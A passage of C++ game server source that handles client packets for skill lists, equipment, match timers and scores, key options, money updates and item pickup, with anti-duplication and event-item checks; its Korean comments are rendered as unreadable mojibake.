#ifdef MODIFY_WEAPONSKILL_STRENGTHEN_ICON_BUGFIX_2ND_20090514
			// Ŭ���̾�Ʈ�� ���� �� �Ʒ� ó�� ���ϵ��� ����
#else // MODIFY_WEAPONSKILL_STRENGTHEN_ICON_BUGFIX_2ND_20090514
	#ifdef MODIFY_WEAPONSKILL_STRENGTHEN_ICON_BUGFIX_20080807	// ���⿡ �پ� �ִ� ��ų���� Ȯ��
			if( g_MasterSkillSystem.CheckUsableWeaponSkill(lpObj, n) == FALSE)
			{
				continue;
			}
	#endif	// MODIFY_WEAPONSKILL_STRENGTHEN_ICON_BUGFIX_20080807
#endif // MODIFY_WEAPONSKILL_STRENGTHEN_ICON_BUGFIX_2ND_20090514

			pList.Pos            = n;
#ifdef MASTER_LEVEL_SKILL_SYSTEM_20071122	// PMSG_MAGICLIST ��Ŷ���� ó��
			pList.wSkillNum		 = lpObj->Magic[n].m_Skill;//(lpObj->Magic[n].m_Type<<4)+(lpObj->Magic[n].m_Index);
			pList.btSkillLevel   = (lpObj->Magic[n].m_Level<<3);
			pList.btSkillLevel  |= (lpObj->Magic[n].m_Skill&0x07);
#else
			pList.MagicInfo[0]   = lpObj->Magic[n].m_Skill;//(lpObj->Magic[n].m_Type<<4)+(lpObj->Magic[n].m_Index);
			pList.MagicInfo[1]   = (lpObj->Magic[n].m_Level<<3);
			pList.MagicInfo[1]  |= (lpObj->Magic[n].m_Skill&0x07);
#endif

			memcpy(sendbuf+lOfs, &pList, sizeof(pList));
			lOfs += sizeof( pList );
			Count++;
		}
	}
	pCount.Count  = Count;
	pCount.h.size = lOfs;
	memcpy(sendbuf, &pCount, sizeof(pCount));

	DataSend(lpObj->m_Index, (LPBYTE)sendbuf, lOfs);
}

//----------------------------------------------------------------------------
// [0xF3][0x13] ��񸮽�Ʈ�� ������.
//----------------------------------------------------------------------------
void GCEquipmentSend(int aIndex)
{
	PMSG_EQUIPMENTLIST	pMsg;
	
	PHeadSubSetB((LPBYTE)&pMsg, 0xF3, 0x13, sizeof( pMsg) );	

	pMsg.NumberH = HIBYTE(aIndex);
	pMsg.NumberL = LOBYTE(aIndex);

	gObjMakePreviewCharSet(aIndex);

	LPOBJECTSTRUCT	lpObj = &gObj[aIndex];

#ifdef ITEM_INDEX_EXTEND_20050706
	memcpy(pMsg.Equipment, lpObj->CharSet, MAX_PREVIEWCHARSET+9);
#else
#ifdef DARKLORD_WORK	
	memcpy(pMsg.Equipment, lpObj->CharSet, MAX_PREVIEWCHARSET+4);
#else	
	memcpy(pMsg.Equipment, lpObj->CharSet, MAX_PREVIEWCHARSET+3);
#endif
#endif
		
	MsgSendV2(lpObj, (LPBYTE)&pMsg, pMsg.h.size);
}

//----------------------------------------------------------------------------
// [0xF3][0x20] ��ȯ������ Life�� �˸���.
void GCRecallMonLife(int aIndex, int maxlife, int life )
{
	if( maxlife <= 0 ) return;

	PMSG_RECALLMONLIFE	pMsg;

	BYTE per  = (life*100)/maxlife;

	PHeadSubSetB((LPBYTE)&pMsg, 0xF3, 0x20, sizeof( pMsg) );	
	pMsg.Life			= per;
	DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
}

//----------------------------------------------------------------------------
// [0xF3][0x22] �ð��� ǥ���Ѵ�. (���� �౸)
#ifdef WORLD_TOURNAMENT_EVENT_SETTING
void GCTimeViewSend(int aIndex, int type, int second)
{
	PMSG_MATCH_TIMEVIEW	pMsg;
	
	PHeadSubSetB((LPBYTE)&pMsg, 0xF3, 0x22, sizeof( pMsg) );	
	
	if( type == eMatchType_BattleSoccer )
	{
		if( second > 600 )
		{
			type = eMatchType_WaitTime;
			second -= 600;
		}
	}
	pMsg.MatchType	= type;
	pMsg.MatchTime		= second;

	DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
}

void GCBTGoalSend(int ground, int x, int y)
{
	LPGUILD_INFO lpGuild;
	LPGUILD_INFO lpTargetGuild;

	PMSG_MATCH_GOAL	pMsg;	
	PHeadSubSetB((LPBYTE)&pMsg, 0xF3, 0x25, sizeof( pMsg) );	

	pMsg.X	= x;
	pMsg.Y	= y;

	lpGuild = gBSGround[ground]->m_BlueTeam;
	lpTargetGuild = gBSGround[ground]->m_RedTeam;

	if( lpGuild )
	{
		for( int UserIndex=0; UserIndex<MAX_GUILD; UserIndex++)
		{
			if( lpGuild->Use[UserIndex] )
			{
				int number = lpGuild->Index[UserIndex];
				if( number >= 0 )
				{
					DataSend(number, (LPBYTE)&pMsg, pMsg.h.size);
				}
			}
		}
	}

	if( lpTargetGuild )
	{
		for( int UserIndex=0; UserIndex<MAX_GUILD; UserIndex++)
		{
			if( lpTargetGuild->Use[UserIndex] )
			{
				int number = lpTargetGuild->Index[UserIndex];
				if( number >= 0 )
				{
					DataSend(number, (LPBYTE)&pMsg, pMsg.h.size);
				}
			}
		}
	}
}
#else
void GCTimeViewSend(int aIndex, int second)
{
	PMSG_TIMEVIEW	pMsg;
	
	PHeadSubSetB((LPBYTE)&pMsg, 0xF3, 0x22, sizeof( pMsg) );	
	pMsg.Second			= second;

	DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
}
#endif

// [0xF3][0x23] ���� ������.
void GCGoalSend(int aIndex, char *Name1, BYTE score1, char *Name2, BYTE score2)
{
	PMSG_GOALSEND pMsg;
	
	PHeadSubSetB((LPBYTE)&pMsg, 0xF3, 0x23, sizeof( pMsg) );	

	memcpy(pMsg.RedTeamName, Name1, MAX_GUILDNAMESTRING);
	pMsg.RedTeamScore   = score1;
	memcpy(pMsg.BlueTeamName, Name2, MAX_GUILDNAMESTRING);
	pMsg.BlueTeamScore   = score2;

	DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
}

// [0xF3][0x30] ��ų Ű ���� �޴´�.
void GCSkillKeyRecv(LPPMSG_SKILLKEY lpMsg, int aIndex)
{	
	if( gObjIsGamePlaing(&gObj[aIndex]) == FALSE ) 
	{
		return;
	}	

#ifdef MODIFY_0708_BUFFIX_20070820	// ��ų Ű���� ����� �ѹ��� �޴´�.
	if( gObj[aIndex].m_bSkillKeyRecv == TRUE )
	{
		return;
	}

	gObj[aIndex].m_bSkillKeyRecv = TRUE;
#endif
	
#ifdef ADD_SEASON_3_NEW_UI_20071122
	BYTE	Rkey = 0;
	if( lpMsg->h.size == sizeof(PMSG_SKILLKEY) )
	{
		Rkey = lpMsg->RkeyDefine;
	}
#endif

#ifdef UPDATE_OPTIONKEY_LEVEL_20080116
	int	QWERLevel = 0;

	if( lpMsg->h.size == sizeof(PMSG_SKILLKEY) )
	{
		QWERLevel = ntohl(lpMsg->QWERLevel);
	}

	DGOptionDataSend(aIndex, gObj[aIndex].Name, lpMsg->SKillKey, lpMsg->GameOption, lpMsg->QkeyDefine, lpMsg->WkeyDefine, lpMsg->EkeyDefine, lpMsg->ChatWindow, Rkey, QWERLevel);
#else	// UPDATE_OPTIONKEY_LEVEL_20080116	
#ifdef VER_CHATWINDOW_OPTION
#ifdef ADD_SEASON_3_NEW_UI_20071122
	DGOptionDataSend(aIndex, gObj[aIndex].Name, lpMsg->SKillKey, lpMsg->GameOption, lpMsg->QkeyDefine, lpMsg->WkeyDefine, lpMsg->EkeyDefine, lpMsg->ChatWindow, Rkey);
#else
	DGOptionDataSend(aIndex, gObj[aIndex].Name, lpMsg->SKillKey, lpMsg->GameOption, lpMsg->QkeyDefine, lpMsg->WkeyDefine, lpMsg->EkeyDefine, lpMsg->ChatWindow);
#endif
#else
	DGOptionDataSend(aIndex, gObj[aIndex].Name, lpMsg->SKillKey, lpMsg->GameOption, lpMsg->QkeyDefine, lpMsg->WkeyDefine, lpMsg->EkeyDefine);
#endif
#endif	// UPDATE_OPTIONKEY_LEVEL_20080116


#ifdef UPDATE_OPTIONKEY_LEVEL_20080116
	LogAddL("Option Recv %d %d %d %d %d %d", lpMsg->GameOption, lpMsg->QkeyDefine, lpMsg->WkeyDefine, lpMsg->EkeyDefine, Rkey, lpMsg->QWERLevel);
#else	// UPDATE_OPTIONKEY_LEVEL_20080116
	LogAddL("Option Recv %d %d %d %d", lpMsg->GameOption, lpMsg->QkeyDefine, lpMsg->WkeyDefine, lpMsg->EkeyDefine);
#endif	// UPDATE_OPTIONKEY_LEVEL_20080116
}

#ifdef UPDATE_OPTIONKEY_LEVEL_20080116
void GCSkillKeySend(int aIndex, LPBYTE keybuffer, BYTE GO, BYTE Qk, BYTE Wk, BYTE Ek, BYTE ChatWnd, BYTE Rk, int QWERLevel)
#else	// UPDATE_OPTIONKEY_LEVEL_20080116
#ifdef VER_CHATWINDOW_OPTION
#ifdef ADD_SEASON_3_NEW_UI_20071122 
void GCSkillKeySend(int aIndex, LPBYTE keybuffer, BYTE GO, BYTE Qk, BYTE Wk, BYTE Ek, BYTE ChatWnd, BYTE Rk)
#else
void GCSkillKeySend(int aIndex, LPBYTE keybuffer, BYTE GO, BYTE Qk, BYTE Wk, BYTE Ek, BYTE ChatWnd)
#endif
#else
void GCSkillKeySend(int aIndex, LPBYTE keybuffer, BYTE GO, BYTE Qk, BYTE Wk, BYTE Ek)
#endif
#endif	// UPDATE_OPTIONKEY_LEVEL_20080116
{
	PMSG_SKILLKEY	pMsg;

	PHeadSubSetB((LPBYTE)&pMsg, 0xF3, 0x30, sizeof( pMsg ));
#ifdef UPDATE_SKILLKEY_EXPAND_20080804
	memcpy(pMsg.SKillKey, keybuffer, 20);
#else	// UPDATE_SKILLKEY_EXPAND_20080804
	memcpy(pMsg.SKillKey, keybuffer, 10);
#endif	// UPDATE_SKILLKEY_EXPAND_20080804
	pMsg.GameOption = GO;
	pMsg.QkeyDefine = Qk;
	pMsg.WkeyDefine = Wk;
	pMsg.EkeyDefine = Ek;

#ifdef VER_CHATWINDOW_OPTION
	pMsg.ChatWindow = ChatWnd;
#endif

#ifdef ADD_SEASON_3_NEW_UI_20071122 
	pMsg.RkeyDefine = Rk;
#endif

#ifdef UPDATE_OPTIONKEY_LEVEL_20080116
	pMsg.QWERLevel	= QWERLevel;
#endif

	DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
#ifdef UPDATE_OPTIONKEY_LEVEL_20080116
	LogAddL("Option Send %d %d %d %d %d %d", GO, Qk, Wk,Ek, Rk, QWERLevel);
#else	// UPDATE_OPTIONKEY_LEVEL_20080116
	LogAddL("Option Send %d %d %d %d", GO, Qk, Wk,Ek);
#endif	// UPDATE_OPTIONKEY_LEVEL_20080116
}


//----------------------------------------------------------------------------
// [0x22] �� �׼��� ������.
//----------------------------------------------------------------------------
void GCMoneySend(int aIndex, DWORD money)
{
	PMSG_ITEMGETRESULT	pMsg;
	WORD hiWord, loWord;

	pMsg.h.c		= PMHCE_BYTE;
	pMsg.h.headcode	= 0x22;
	pMsg.h.size     = sizeof( pMsg );
	pMsg.result     = 0xFE;

	hiWord = HIWORD(money);
	loWord = LOWORD(money);

	pMsg.Data[0] = HIBYTE(hiWord);
	pMsg.Data[1] = LOBYTE(hiWord);
	pMsg.Data[2] = HIBYTE(loWord);
	pMsg.Data[3] = LOBYTE(loWord);

	DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
}

//----------------------------------------------------------------------------
// [0x22] �κ��丮�� ������ �߰� 
//----------------------------------------------------------------------------
void GCItemInventoryPutSend(int aIndex, BYTE result, BYTE iteminfo1, BYTE iteminfo2)
{
	PMSG_ITEMGETRESULT	pResult;
	pResult.h.c        = PMHCE_BYTE;
	pResult.h.headcode = 0x22;
	pResult.h.size     = sizeof( pResult );
	pResult.result     = result;
	pResult.Data[0]	   = iteminfo1;
	pResult.Data[1]	   = iteminfo2;	
	pResult.h.size	  -= 2;
	DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
}

// 0x2B �������� �ش�.
/* ������
void GCItemGive(int aIndex, LPBYTE data)
{
	PMSG_ITEMGIVE	pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0x2B, sizeof( pMsg ));

	memcpy(pMsg.Data, data, 4);
	DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
}
*/

//----------------------------------------------------------------------------
// �������� �ֿ��ٴ� ��û�� ���� ó������� �˸���.
//----------------------------------------------------------------------------
void CGItemGetRequest(LPPMSG_ITEMGETREQUEST lpMsg, int aIndex)
{
	int  item_num;
	int  map_num;
	PMSG_ITEMGETRESULT	pResult;

	pResult.h.c        = PMHCE_BYTE;
	pResult.h.headcode = 0x22;
	pResult.h.size     = sizeof( pResult );
	pResult.result     = 0xFF;

	if( gObjIsConnected(aIndex) == FALSE )
	{
		CloseClient ( aIndex );
		return;
	}

	// �������̸� ������ ������ ����
	if( gObj[aIndex].CloseType != -1 ) 
	{
		return;
	}
	
#ifdef USER_DIE_ITEMGET_BUG_PATCH_20040322
	// �׾�� ���̸� ���� �� ����
	if( gObj[aIndex].DieRegen ) 
	{
		pResult.result = 0xFF;
		pResult.h.size -= ITEM_BUFFER_SIZE;
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}
#endif
	
#ifdef ADD_NEWPVP_PKFIELD
	if ( g_NewPVP.IsObserver(gObj[aIndex]) )
	{
		pResult.result = 0xFF;
		pResult.h.size -= ITEM_BUFFER_SIZE;
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}
#endif // ADD_NEWPVP_PKFIELD
	
	// �ŷ�&â��&ī�����ڽ�... ��� �� �϶��� ������ ������ �� �� ����..
	if( gObj[aIndex].m_IfState.use )
	{
		if( gObj[aIndex].m_IfState.type != I_SHOP )
		{
			GCServerMsgStringSend(lMsg.Get(1118), aIndex, 1);
			pResult.result = 0xFF;

			pResult.h.size -= ITEM_BUFFER_SIZE;
			DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
			return;
		}
	}

#ifdef ITEM_DUPLICATE_PREVENT_PATCH_20040719		// ������ ���� ���� - �������� ���� ��
	if (gObjFixInventoryPointer(aIndex) == false) {
		LogAdd("[Fix Inv.Ptr] False Location - %s, %d", __FILE__, __LINE__);
	}
#endif

#ifdef ITEM_DUPLICATE_PREVENT_PATCH_BUGFIX_20040825		// Ʈ������� �ɷ��ִ� ���¿��� �������� ���� �� ����.
	if (gObj[aIndex].pTransaction == 1) {
		LogAddTD("[%s][%s] CGItemGetRequest() Failed : Transaction == 1, IF_TYPE : %d",
			gObj[aIndex].AccountID,
			gObj[aIndex].Name,
			gObj[aIndex].m_IfState.type
			);
		return;
	}
#endif

	//if( PacketCheckTime(&gObj[aIndex]) == FALSE ) return;

	item_num = MAKEWORD(lpMsg->NumberL, lpMsg->NumberH);
	if( !CHECK_LIMIT(item_num, MAX_MAPITEM ) ) 
	{
		LogAdd("error-L3 : %s %d", __FILE__, __LINE__);		
		pResult.result = 0xFF;
		pResult.h.size -= ITEM_BUFFER_SIZE;
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}

	map_num = gObj[aIndex].MapNumber;
	if( !CHECK_LIMIT(map_num, g_TerrainManager.Size() ) ) 
	{
		LogAdd("error-L3 : %s %d", __FILE__, __LINE__);
		//return;
		pResult.result = 0xFF;
		pResult.h.size -= ITEM_BUFFER_SIZE;

		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}

	int type, level, special, Noption;
	char szItemName[50];

	CMapItem * lpItem = (CMapItem*)(&MapC[map_num].m_cItem[item_num]);


	// �������� ������..
	if( lpItem->IsItem() == TRUE 
#ifdef ITEM_GET_BUGFIX_20050406
		&& (lpItem->Give == 0 && lpItem->live == 1)
#endif
		)
	{
#ifdef MODIFY_QUEST_MONSTER_KILL_COUNT_BUGFIX_20070704	// ����Ʈ ������ ���� ó��
		if( lpItem->m_QuestItem )
		{	// ����Ʈ �������ϰ��
			// 1. �������� �����ϴ� ����Ʈ�ΰ�?
			BOOL bIsGetItem = g_QuestInfo.GetQuestItem( aIndex, lpItem->m_Type, lpItem->m_Level );
			if( bIsGetItem == FALSE )
			{
				pResult.result = 0xFF;
				pResult.h.size -= ITEM_BUFFER_SIZE;
				
				DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
				return;
			}
		}
#else
	
#ifdef NEW_SKILL_FORSKYLAND
		if( lpItem->m_QuestItem )
		{	// ����Ʈ �������ϰ��
			int itemcnt = gObjGetItemCountInIventory(aIndex, lpItem->m_Type);
			if( itemcnt > 0 )
			{
				LogAdd("[Quest] Too many have quest item [%s][%s] (%s) %d", 
						gObj[aIndex].AccountID, gObj[aIndex].Name, lpItem->GetName(), itemcnt);
				//GCServerMsgStringSend("�������� ����Ʈ �������� ������ �����ϴ�", aIndex, 1);
				pResult.result = 0xFF;
				pResult.h.size -= ITEM_BUFFER_SIZE;
				
				DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
				return;
			}
		}
#endif
#endif	// MODIFY_QUEST_MONSTER_KILL_COUNT_BUGFIX_20070704

#ifdef RING_EVENT_ITEMBOX_20031124		// �����̺�Ʈ - �ݱ����� (�����ǹ���-������, �������ǹ���-1���̻������)

	#ifndef FOR_ONAIR
	#if TESTSERVER != 1
		if ( lpItem->m_Type == MAKE_ITEMNUM(13, 20) ) {
			switch(lpItem->m_Level) {
			case 0 :	// �������� ����
				{
#ifdef MODIFY_MAGICIARINGRING_TRADE_BUGFIX_20070328	// ������ �ֿ� �� �ֵ��� ����
					int itemcnt = gObjGetItemCountInIventory(aIndex, lpItem->m_Type/MAX_ITEM_INDEX, lpItem->m_Type%MAX_ITEM_INDEX, lpItem->m_Level);
					if( itemcnt > 0 )
					{
						LogAdd("[Ring Event] Too many have Magician's Ring [%s][%s] (Name:%s, Count:%d)", 
								gObj[aIndex].AccountID, gObj[aIndex].Name, lpItem->GetName(), itemcnt);
						pResult.result = 0xFF;
						pResult.h.size -= ITEM_BUFFER_SIZE;
						DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);

						GCServerMsgStringSend(lMsg.Get(1210), aIndex, 1);		// "����� �̹� �������� ������ ������ �����Ƿ� ���� �� �����ϴ�."
						return;
					}
				}
#endif
				break;
			case 1 :	// ����� ����
				{
#ifndef FOR_ONAIR
#if TESTSERVER != 1
					
					pResult.result = 0xFF;
					pResult.h.size -= ITEM_BUFFER_SIZE;
					DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
					return;
#endif
#endif
				}
				break;
			}
		}
	#endif
	#endif
#endif

		
#ifdef MU_CHN_THANKS_RING_EVENT_20040908	// �߱� �̺�Ʈ - ������ ���� 
	#ifndef FOR_ONAIR
	#if TESTSERVER != 1
		if ( lpItem->m_Type == MAKE_ITEMNUM(13, 20) ) {
			switch(lpItem->m_Level) {
			case 3 :	// ������ ����
				{
					int itemcnt = gObjGetItemCountInIventory(aIndex, lpItem->m_Type/MAX_ITEM_INDEX, lpItem->m_Type%MAX_ITEM_INDEX, lpItem->m_Level);
					if( itemcnt > 0 )
					{
						LogAdd("[China Ring Event] Too many have Ring of Glory [%s][%s] (Name:%s, Count:%d)", 
								gObj[aIndex].AccountID, gObj[aIndex].Name, lpItem->GetName(), itemcnt);
						pResult.result = 0xFF;
						pResult.h.size -= ITEM_BUFFER_SIZE;
						DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);

						GCServerMsgStringSend(lMsg.Get(1210), aIndex, 1);		// "����� �̹� ������ ������ ������ �����Ƿ� ���� �� �����ϴ�."
						return;
					}
				}
				break;
			}
		}
	#endif
	#endif
#endif


#ifdef FRIENDSHIP_EVENT_RING_BOX_20040211		// ��ģ�� �̺�Ʈ - ������ ������ ���� �� ����
	#ifndef FOR_ONAIR
	#if TESTSERVER != 1

		if (lpItem->m_Type == MAKE_ITEMNUM(13, 20) &&
			lpItem->m_Level == 2
			) 
		{
			pResult.result = 0xFF;
			pResult.h.size -= ITEM_BUFFER_SIZE;
			DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
			return;
		}

	#endif
	#endif
#endif
		
#ifdef KANTURU_MOONSTONEPENDANT_20060804		// ���������Ʈ - 1�� �̻� ��������. 20060823�߰�
		if( lpItem->m_Type == MAKE_ITEMNUM( 13, 38 ) )
		{	
			int itemcnt = gObjGetItemCountInIventory( aIndex, lpItem->m_Type / MAX_ITEM_INDEX, lpItem->m_Type % MAX_ITEM_INDEX, lpItem->m_Level );
			if( itemcnt > 0 )
			{
				LogAdd("[ MoonStonePendant ] Too many have MoonStonePendant [%s][%s] ( Name:%s, Count:%d )", 
						gObj[aIndex].AccountID, gObj[aIndex].Name, lpItem->GetName(), itemcnt);
				pResult.result = 0xFF;
				pResult.h.size -= ITEM_BUFFER_SIZE;
				DataSend( aIndex, ( LPBYTE )&pResult, pResult.h.size );

				GCServerMsgStringSend( lMsg.Get( 3384 ), aIndex, 1 );		// 20060830 WTF �۾� "����� �̹� ���������Ʈ�� ������ �ֽ��ϴ�."
				return;
			}
		}
#endif
		
#ifdef ADD_ELITE_SKELETON_WORRIOR_CHANGE_RING_20060830	// 1�� �̻� ���� �Ұ�
		if( lpItem->m_Type == MAKE_ITEMNUM( 13, 39 ) )
		{	
			int itemcnt = gObjGetItemCountInIventory( aIndex, lpItem->m_Type / MAX_ITEM_INDEX, lpItem->m_Type % MAX_ITEM_INDEX, lpItem->m_Level );
			if( itemcnt > 0 )
			{
				LogAdd("[ ChangeRing ] Too many have ChangeRing [%s][%s] ( Name:%s, Count:%d )", 
						gObj[aIndex].AccountID, gObj[aIndex].Name, lpItem->GetName(), itemcnt);
				pResult.result = 0xFF;
				pResult.h.size -= ITEM_BUFFER_SIZE;
				DataSend( aIndex, ( LPBYTE )&pResult, pResult.h.size );

				GCServerMsgStringSend( lMsg.Get( 3391 ), aIndex, 1 );		// 20060830 WTF �۾� "����� �̹� ���Ź����� ������ �ֽ��ϴ�."
				return;
			}
		}
#endif

		type = lpItem->m_Type;
		level = lpItem->m_Level;
		special = lpItem->m_Special[0];
		Noption = lpItem->m_NewOption;

		strcpy( szItemName, lpItem->GetName());

		// ���϶�..
		if( lpItem->m_Type == GOLD_TYPE_INDEX )
		{
			if( MapC[map_num].ItemGive(aIndex, item_num) == TRUE )
			{
				
#ifdef MODIFY_ZEN_MAX_20040414
				if( !gObjCheckMaxZen( aIndex, lpItem->m_BuyMoney ) )
				{
					if( gObj[aIndex].Money < MAX_ZEN )
					{
						WORD hiWord, loWord;
						
						gObj[aIndex].Money = MAX_ZEN;
						pResult.result = 0xFE;
						hiWord = HIWORD(gObj[aIndex].Money);
						loWord = LOWORD(gObj[aIndex].Money);
						pResult.Data[0] = HIBYTE(hiWord);
						pResult.Data[1] = LOBYTE(hiWord);
						pResult.Data[2] = HIBYTE(loWord);
						pResult.Data[3] = LOBYTE(loWord);

						DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);

						return;
					}
					else
					{
						pResult.result = 0xFF;
						pResult.h.size -= ITEM_BUFFER_SIZE;
						DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
						return;
					}

				}
#endif
				WORD hiWord, loWord;

				gObj[aIndex].Money += lpItem->m_BuyMoney;
				pResult.result = 0xFE;
				hiWord = HIWORD(gObj[aIndex].Money);
				loWord = LOWORD(gObj[aIndex].Money);
				pResult.Data[0] = HIBYTE(hiWord);
				pResult.Data[1] = LOBYTE(hiWord);
				pResult.Data[2] = HIBYTE(loWord);
				pResult.Data[3] = LOBYTE(loWord);

				pResult.h.size -= (ITEM_BUFFER_SIZE-MONEY_BUFFER_SIZE);

				//LogAddTD("[%s][%s] �� �ݱ� (��:%d/%d)",gObj[aIndex].AccountID, gObj[aIndex].Name, lpItem->m_BuyMoney, gObj[aIndex].Money);
			}
			DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		}
		else 
		{

#ifdef ADD_ITEM_FENRIR_01_20051110
			// �渱 ���� �������� �ֿ��� �� ���������� �Ѵ�.

			// 1. ���� ����

			if ( lpItem->m_Type == MAKE_ITEMNUM(13, 32) ) 
			{
				int iInventoryIndex = gObjOverlapItemUsingDur( lpItem, map_num, item_num, aIndex, MAX_OVERLAP_FENRIR_MIX_STUFF_01, MAKE_ITEMNUM(13,32), 0);

				if( CHECK_LIMIT(iInventoryIndex, MAX_INVENTORY) )
				{
					// �������� �������̹Ƿ� �ʵ忡���� ������� �Ѵ�.
					pResult.result	= 0xFD;				
					DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
					gObj[aIndex].pInventory[iInventoryIndex].m_Durability += lpItem->m_Durability;
					GCItemDurSend(aIndex, iInventoryIndex, (int)gObj[aIndex].pInventory[iInventoryIndex].m_Durability, 0);

					return;
				}
				else
				{
					
				}
				
			}
			
			// 2. ������ ��ȣ
			if ( lpItem->m_Type == MAKE_ITEMNUM(13, 33) ) 
			{
				int iInventoryIndex = gObjOverlapItemUsingDur( lpItem, map_num, item_num, aIndex, MAX_OVERLAP_FENRIR_MIX_STUFF_02, MAKE_ITEMNUM(13,33), 0);

				if( CHECK_LIMIT(iInventoryIndex, MAX_INVENTORY) )
				{
					// �������� �������̹Ƿ� �ʵ忡���� ������� �Ѵ�.
					pResult.result	= 0xFD;				
					DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
					gObj[aIndex].pInventory[iInventoryIndex].m_Durability += lpItem->m_Durability;
					GCItemDurSend(aIndex, iInventoryIndex, (int)gObj[aIndex].pInventory[iInventoryIndex].m_Durability, 0);

					return;
				}
				else
				{

				}
				
			}

			// 3. �ͼ��� ����
			if ( lpItem->m_Type == MAKE_ITEMNUM(13, 34) ) 
			{
				int iInventoryIndex = gObjOverlapItemUsingDur( lpItem, map_num, item_num, aIndex, MAX_OVERLAP_FENRIR_MIX_STUFF_03, MAKE_ITEMNUM(13,34), 0);

				if( CHECK_LIMIT(iInventoryIndex, MAX_INVENTORY) )
				{
					// �������� �������̹Ƿ� �ʵ忡���� ������� �Ѵ�.
					pResult.result	= 0xFD;				
					DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
					gObj[aIndex].pInventory[iInventoryIndex].m_Durability += lpItem->m_Durability;
					GCItemDurSend(aIndex, iInventoryIndex, (int)gObj[aIndex].pInventory[iInventoryIndex].m_Durability, 0);

					return;
				}
				else
				{
					
				}
				
			}

#endif // ADD_ITEM_FENRIR_01_20051110

#ifdef MODIFY_BUFF_SYSTEM_EXTENTION_CASHSHOP_20080318
			// ����Ʈ ���� ��ġ��
			if ( lpItem->m_Type == MAKE_ITEMNUM(14, 70)
				|| lpItem->m_Type == MAKE_ITEMNUM(14, 71)
				|| lpItem->m_Type == MAKE_ITEMNUM(14, 94)
#ifdef ADD_ELITE_SD_POTION_20090918
				|| lpItem->m_Type == MAKE_ITEMNUM(14, 133)
#endif // ADD_ELITE_SD_POTION_20090918
				)
			{
				int iInventoryIndex = gObjOverlapItemUsingDur( lpItem, map_num, item_num, aIndex, MAX_OVERLAP_ELITE_POTION, lpItem->m_Type, 0);
				if( CHECK_LIMIT(iInventoryIndex, MAX_INVENTORY) )
				{
					// �������� �������̹Ƿ� �ʵ忡���� ������� �Ѵ�.
					pResult.result	= 0xFD;				
					DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
					gObj[aIndex].pInventory[iInventoryIndex].m_Durability += lpItem->m_Durability;
					GCItemDurSend(aIndex, iInventoryIndex, (int)gObj[aIndex].pInventory[iInventoryIndex].m_Durability, 0);
					
					return;
				}
			}
#endif // MODIFY_BUFF_SYSTEM_EXTENTION_CASHSHOP_20080318			

#ifdef ADD_EVENT_CHERRYBLOSSOM_20080312
			// ���ɰ���(�Ͼ�, ����, Ȳ��)
			if ( lpItem->m_Type == MAKE_ITEMNUM(14, 88) 
				|| lpItem->m_Type == MAKE_ITEMNUM(14, 89) 
				|| lpItem->m_Type == MAKE_ITEMNUM(14, 90) 
				|| lpItem->m_Type == MAKE_ITEMNUM(14, 85)	// ���ɼ�
				|| lpItem->m_Type == MAKE_ITEMNUM(14, 86)	// ���ɳ��̰��
				|| lpItem->m_Type == MAKE_ITEMNUM(14, 87)	// ���ɲ���
				)
			{
				int nMaxOverlapped = 1;
				switch (lpItem->m_Type)
				{
				case MAKE_ITEMNUM2(14, 88):	nMaxOverlapped = MAX_OVERLAP_CHERRYBLOSSOM_WHITE;	break;
				case MAKE_ITEMNUM2(14, 89):	nMaxOverlapped = MAX_OVERLAP_CHERRYBLOSSOM_RED;		break;
				case MAKE_ITEMNUM2(14, 90):	nMaxOverlapped = MAX_OVERLAP_CHERRYBLOSSOM_GOLD;	break;
				case MAKE_ITEMNUM2(14, 85):	nMaxOverlapped = MAX_OVERLAP_CHERRYBLOSSOM_ITEM_DEFAULT;	break;
				case MAKE_ITEMNUM2(14, 86):	nMaxOverlapped = MAX_OVERLAP_CHERRYBLOSSOM_ITEM_DEFAULT;	break;
				case MAKE_ITEMNUM2(14, 87):	nMaxOverlapped = MAX_OVERLAP_CHERRYBLOSSOM_ITEM_DEFAULT;	break;
				}
				
				int iInventoryIndex = gObjOverlapItemUsingDur( lpItem, map_num, item_num, aIndex, nMaxOverlapped, lpItem->m_Type, 0);
				if( CHECK_LIMIT(iInventoryIndex, MAX_INVENTORY) )
				{
					// �������� �������̹Ƿ� �ʵ忡���� ������� �Ѵ�.
					pResult.result	= 0xFD;				
					DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
					gObj[aIndex].pInventory[iInventoryIndex].m_Durability += lpItem->m_Durability;
					GCItemDurSend(aIndex, iInventoryIndex, (int)gObj[aIndex].pInventory[iInventoryIndex].m_Durability, 0);
					
					return;
				}
			}
#endif // ADD_EVENT_CHERRYBLOSSOM_20080312				

#ifdef ADD_NEW_MAP_KALIMA_20040518					// ����� ǥ���� �ֿ��� �� ���������� �Ѵ�.
			if (lpItem->m_Type == MAKE_ITEMNUM(14, 29)) {

				for (INT iLoop = 0 ; iLoop < MAX_INVENTORY ; iLoop++) {

